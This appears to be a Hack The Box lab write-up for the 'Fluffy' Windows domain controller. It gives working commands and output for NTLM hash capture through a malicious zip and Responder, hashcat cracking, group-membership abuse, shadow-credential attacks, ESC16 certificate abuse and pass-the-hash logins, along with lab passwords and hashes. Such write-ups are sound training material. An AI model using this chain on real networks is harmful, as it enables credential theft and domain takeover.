#box #responder #BloodHound #GenericAll #Kerberoasting #shadow-credentials  #pywhisker #certipy #TGT #ccache 
Fluffy is a medium box based on a vulnerability which permits to spoof the NTLM of an user from unzipping a malicious file on a target pc. By listening with impacket-smbserver or Responder we're able to spoof the NTLM of an user unzipping our malicious file.
Once obtained the foothold, the foothold belongs to the Service Account Managers group, which has Generic All over Service Accounts. Since we find out that Service Accounts users appear to be vulnerable to the Shadow Credential attakc, we first add our foothold to the Service Account group and then we perform a Shadow Credential attack to retrieve the NT hash for the vulnerable users. Obtained the NT of `winrm_svc` we can then authenticated and catch the first flag.
We then discover an attack vector called [ESC16](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6) that permits us to perform a privilege escalation by associating the impersonation rights of an user to another user. To do so, we use a tool called `certipy` and enumerate the available users we have to find one user which has a vulnerability that we leverage to escalate. We discover that `ca_svc` is vulnerable to ESC16 and we use its right to associate the impersonation right of the administrator to our initial foothold, `p.agila` by changing its UPN (User Principal Name) and by requesting a ticket as `ca_svc`. Once obtained the ticket, we ask for a certificate obtaining the `administrator.pfx` certificate. Once received, we're now able to authenticate as administrator with the passed certificate, obtaining machine's root.

## Nmap
The scan returns a few interesting results, the open SMB and the presence of a LDAP and Kerberos on that machine. The fact that port 88 is open means that we're dealing with a DC, further identified in the rest of the scan as DC01.fluffy.htb

```bash
# Nmap 7.95 scan initiated Tue Jun 17 19:16:30 2025 as: /usr/lib/nmap/nmap -sCV --min-rate=10000 -o nmap_sCV fluffy.htb
Nmap scan report for fluffy.htb (10.10.11.69)
Host is up (0.035s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-18 02:16:36Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-18T02:17:58+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-06-18T02:17:58+00:00; +7h00m00s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-18T02:17:58+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-18T02:17:58+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-06-18T02:17:17
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun 17 19:17:58 2025 -- 1 IP address (1 host up) scanned in 88.01 seconds
```

## SMB

We first check, with the credentials given from HTB to simulate a real pentest: `j.fleischman:J0elTHEM4n1990!`

```bash
smbclient -U FLUFFY/j.fleischman -L //10.10.11.69
Password for [FLUFFY\j.fleischman]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	IT              Disk      
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
```

We lurk inside the available shares: IT, NETLOGON, SYSVOL and in IT we discovered an interesting PDF containing the results of a recent audit and the vulnerability their system is subject to:
![[attachments/fluffy-writeup-1.webp]]

## First foothold with CVE-2025-24996

By investigating those vulnerabilities, we discover that one could potentially come in our help with our actual position, precisely: [CVE-2025-24996](https://nvd.nist.gov/vuln/detail/CVE-2025-24996).
The vulnerability displays the possibility to spoof the NTLM hash of a given user extrapolating a malicious zip. 
To use the vulnerability, we download the following [PoC](https://github.com/0x6rss/CVE-2025-24071_PoC) and we run it and input the zip filename and the attacker's machine address of our SMB Share. A zip file will be generated.

Once the file is generated, we first run our `responder -I tun0` instance on a terminal, and we then upload the zip file to IT's SMB Share. After a minute, we shall receive the target NTLM accordingly on our responder's instance.

![[attachments/fluffy-writeup-2.webp]]
### Cracking the hash with Hashcat

To discover the password we use Hashcat in mode 5600 (NTLMv2) to find out the given hash

```bash
hashcat -m 5600 ntlmv2_hash.txt /home/HTB/Sau/rockyou.txt
```

and finding out that our foothold corresponds to `p.agila:prometheusx-303`
## Bloodhound Scan in the Domain

We run a bloodhound-python scan and then ingest the zip into Bloodhound
Once obtained the files, we can import them on bloodhound.
## Adding `p.agila` to the Service Accounts group

Our scan, by starting with our foothold, shows how our foothold belongs to the Service Account Managers group, and how this group has a GenericAll bind with the Service Accounts group.
We assign our foothold `p.agila` to the Service Accounts group in order to be able to modify the memberships of the group.

![[attachments/fluffy-writeup-3.webp]]

To assign our user to that group we follow the Linux abuse tips from bloodhound on the right:

![[attachments/fluffy-writeup-4.webp]]

We opt to use `net rpc` commands since Samba is open and proceed to the assignment with:

```bash
net rpc group addmem "Service Accounts" "p.agila" -U "FLUFFY.HTB/p.agila%prometheusx-303" -S "10.10.11.69"
```

Once done, to reverse check that this has worked we run

```bash
net rpc group members "Service Accounts" -U "FLUFFY/p.agila%prometheusx-303" -S "10.10.11.69"
```

This will basically output to us all the members belonging to the Service Accounts group:
```bash
FLUFFY\ca_svc
FLUFFY\ldap_svc
FLUFFY\p.agila
FLUFFY\winrm_svc
```

## Obtaining Shadow Credentials of `svc` users with Kerberoast

Since Service Accounts have GenericWrite claim over `ca_svc`, `ldap_svc`, `winrm_svc`, BloodHound suggests us to use a Targeted Kerberoast attack on this account, or alternatively a Shadow Credentials attack. After trying the Kerberoast attack, we're then unable to crack the hashes offline, so we opt for a Shadow Credentials attack. To do so, we use `pywhisker` as suggested by Bloodhound.
To do that, we compile the pywhisker command as intended:

```bash
python3 pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "add"
```

At first, we might obtain an error related to the clock skew. To fix it, we'll basically have to align our datetime to the target's datetime. To do so, we can follow [this](https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069) guide. We'll basically need to:
```bash
timedatectl set-ntp off
rdate -n 10.10.11.69
```
Obtaining the pfx file and the relative password attached to it.
Alternatively, we can opt for a tool called `certipy` to proceed with the Shadow Credentials attack. We first install it within this [installation](https://github.com/ly4k/Certipy/wiki/04-%E2%80%90-Installation) guide. We then opt for the following command to retrieve the Shadow Credentials of users connected to the Service Accounts manager since the group has GenericWrite over the users of the group

```bash
certipy shadow -account 'winrm_svc' -dc-ip 10.10.11.69 -u 'p.agila@fluffy.htb' -p 'prometheusx-303' auto
```

Obtaining the hash of the target, and being able to authenticate to the target machine with winrm.

```bash
evil-winrm -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767 -i 10.10.11.69
```
## Privilege Escalation through CA

To escalate in the target machine, we'll have to seek for potential vulnerabilities within the 3 available users belonging to the Service Accounts group. To do so, we use certipy, to gain further information on those users in the domain. To do so we can use the `-vulnerable` flag of Certipy. This will output a txt file with the list of vulnerabilities for the given user.

```bash
certipy find -vulnerable -u WINRM_SVC -hashes ":33bd09dcd697600edf6b3a7af4875767" -dc-ip 10.10.11.69
certipy find -vulnerable -u LDAP_SVC -hashes ":22151d74ba3de931a352cba1f9393a37" -dc-ip 10.10.11.69
certipy find -vulnerable -u CA_SVC -hashes ":ca0f4f9e9eb8a092addf53bb03fc98c8" -dc-ip 10.10.11.69
```

Once scanned them all, we discover that CA_SVC has a vulnerability called `ESC16: Security Extension is disabled`.

By looking online we discover that's a naming given by Certipy and we can find a walkthrough on the escalation [here](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally).
To resume, it's a vulnerability defining the unreliability of the certificates issued by the CA. To escalate we can basically set the UPN of the vulnerable user equal to the administrator and then obtain the administrator TGT. Once obtained the TGT we can finally request the administrator's certificate, revert the victim account to its initial UPN and authenticate as administrator.

### Setting UPN of `administrator` to `ca_svc`

To change the UPN of `ca_svc` we can issue the following commands:

First we check the initial status of the user, in case we want to restore it
```bash
certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -user 'ca_svc' read

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : ca_svc@fluffy.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-06-21T22:51:39+00:00
```

Then we effectively update the UPN (UserPrincipalName):
```bash
certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

Then we reverse check that the update has occurred by noticing the new UPN:
```bash

certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -user 'ca_svc' read

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
	userPrincipalName                   : administrator # We notice how this value has changed from the previous one
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-06-21T23:06:29+00:00
```

### Requesting a TGT in `.ccache`

To request a TGT we can use the Shadow Credentials attack on `ca_svc`, since we've updated its UPN. Obtaining a TGT will grant us the possibility to make a request and obtain the UPN's certificate (in this case administrator's certificate)
```bash
certipy shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -account 'ca_svc' auto

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'e4f3052a32cc4037bb8125589c6c80d4'
[*] Adding Key Credential with device ID 'e4f3052a32cc4037bb8125589c6c80d4' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'e4f3052a32cc4037bb8125589c6c80d4' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

We then add the `.ccache` file to our `KRB5CCNAME` with:

```bash
export KRB5CCNAME=ca_svc.ccache
```
### Obtaining `ca_svc`'s UPN Certificate with `ca_svc` TGT

At this point, we're able to ask for a TGT for the `ca_svc` user that will then be able to generate a certificate for the administrator user since its UPN has been changed.

```bash
certipy req -k -dc-ip 10.10.11.69 -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 32
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

### Reverting `ca_svc` UPN to authenticate as `administrator`

It's necessary to reset the UPN of `ca_svc` because otherwise the authentication as administrator will likely fail (probably the system finds two users with the same UPN and fails to authenticate). To do so we issue the previous command in reverse, by setting the initial UPN.

```bash
certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
```
### Authenticating as `administrator` within its certificate

```bash
certipy auth -dc-ip 10.10.11.69 -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

### evil-winrm into the machine and obtain the flag

At this point, we'll be able to authenticate with our certificate in evil-winrm obtaining the DC.

```bash
evil-winrm -i 10.10.11.69 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
```
# TIL

* I definitely need more knowledge on AD to understand concepts more thoroughly
* Do not rely exclusively on bloodhound for attack vectors
* Certipy is really good tool and has intrinsic vulnerabilities documented [here](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
* Sometimes the clock can be an issue and requires us to sync with the target machine